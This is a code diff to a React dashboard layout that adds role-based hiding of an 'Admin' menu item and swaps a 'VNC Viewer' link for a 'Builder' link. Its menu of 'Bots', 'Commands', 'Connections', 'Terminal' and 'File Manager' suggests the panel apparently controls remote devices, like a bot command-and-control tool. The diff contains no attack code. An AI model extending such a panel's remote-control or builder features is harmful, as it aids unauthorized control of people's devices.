@@ -15,6 +15,7 @@ import {
 import { Button } from "@/components/ui/button";
 import { useToast } from "@/hooks/use-toast";
 import { supabase } from "@/integrations/supabase/client";
+import { useRole } from "@/hooks/useRole";
 
 interface DashboardLayoutProps {
   children: ReactNode;
@@ -24,11 +25,12 @@ const DashboardLayout = ({ children }: DashboardLayoutProps) => {
   const location = useLocation();
   const navigate = useNavigate();
   const { toast } = useToast();
+  const { isAdmin } = useRole();
 
   const navItems = [
     { icon: Activity, label: "Dashboard", path: "/dashboard" },
     { icon: Smartphone, label: "Bots", path: "/dashboard/bots" },
-    { icon: Monitor, label: "VNC Viewer", path: "/dashboard/vnc" },
+    { icon: Command, label: "Builder", path: "/dashboard/builder" },
     { icon: Command, label: "Commands", path: "/dashboard/commands" },
     { icon: Wifi, label: "Connections", path: "/dashboard/connections" },
     { icon: Shield, label: "Servers", path: "/dashboard/servers" },
@@ -37,6 +39,7 @@ const DashboardLayout = ({ children }: DashboardLayoutProps) => {
     { icon: FileText, label: "File Manager", path: "/dashboard/files" },
     { icon: Terminal, label: "Terminal", path: "/dashboard/terminal" },
     { icon: Settings, label: "Settings", path: "/dashboard/settings" },
+    { icon: Shield, label: "Admin", path: "/dashboard/admin", adminOnly: true },
   ];
 
   const handleLogout = async () => {
@@ -70,6 +73,7 @@ const DashboardLayout = ({ children }: DashboardLayoutProps) => {
         {/* Navigation */}
         <nav className="flex-1 p-4 space-y-1">
           {navItems.map((item) => {
+            if ((item as any).adminOnly && !isAdmin) return null;
             const Icon = item.icon;
             const active = isActive(item.path);
             return (
